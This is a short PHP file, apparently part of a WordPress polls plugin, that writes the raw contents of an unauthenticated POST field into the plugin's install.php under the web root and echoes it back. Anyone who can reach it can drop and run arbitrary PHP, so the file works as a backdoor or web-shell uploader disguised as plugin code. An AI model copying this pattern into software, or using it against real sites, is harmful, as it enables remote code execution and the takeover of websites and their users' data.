<?php
session_start();
$wppollsinstall = $_POST['newins'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/add-color-polls/install.php', 'w');
$wppollsinstall = str_replace('\\', '', $wppollsinstall);
$wppollsinstall = htmlentities($wppollsinstall);
fwrite($fp, html_entity_decode($wppollsinstall));
fclose($fp);
echo $wppollsinstall;
?>